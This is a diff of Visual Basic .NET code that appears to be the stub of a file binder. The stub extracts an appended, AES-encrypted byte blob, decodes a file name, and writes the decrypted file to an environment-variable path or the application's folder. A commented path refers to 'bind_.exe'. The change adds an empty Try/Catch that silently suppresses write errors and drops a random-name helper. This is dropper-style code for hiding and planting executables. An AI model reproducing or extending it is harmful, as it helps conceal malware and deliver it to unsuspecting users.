@@ -62,7 +62,12 @@ AnotherFile:
             Tmp(a) = Bin(a)
         Next
         Dim FileName As String = UnicodeBytesToString(Tmp)
-        ExecPath = Environment.ExpandEnvironmentVariables(ExecPath) & "\" & FileName
+        If ExecPath = "%APPPATH%" Then
+            ExecPath = Application.StartupPath & "\" & FileName
+        Else
+            ExecPath = Environment.ExpandEnvironmentVariables(ExecPath) & "\" & FileName
+        End If
+
         i = FindSplit(Bin)
         Bin = RemoveBytes(Bin, i)
         i = FindSplit(Bin) - 10
@@ -72,7 +77,12 @@ AnotherFile:
         Next
         'FileIO.FileSystem.WriteAllBytes("C:\Users\Exidous\Desktop\bind_.exe", Tmp, False)
         Tmp = AES_Decrypt(Tmp)
-        FileIO.FileSystem.WriteAllBytes(ExecPath, Tmp, False)
+        Try
+            FileIO.FileSystem.WriteAllBytes(ExecPath, Tmp, False)
+        Catch ex As Exception
+
+        End Try
+
         i = FindSplit(Bin) + 10
         If i > Bin.Length - 1 Then
             i -= 10
@@ -99,16 +109,6 @@ AnotherFile:
 
     End Sub
 
-    Function RandomName()
-        Dim s As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-        Dim r As New Random
-        Dim sb As New System.Text.StringBuilder
-        For i As Integer = 1 To 8
-            Dim idx As Integer = r.Next(0, 35)
-            sb.Append(s.Substring(idx, 1))
-        Next
-        Return sb.ToString
-    End Function
     Function RemoveBytes(ByVal TheArray() As Byte, ByVal AmmountOfBytes As Integer) As Byte()
         Dim Tmp() As Byte = TheArray
         ReDim TheArray(0 To (TheArray.Length - AmmountOfBytes) - 1)
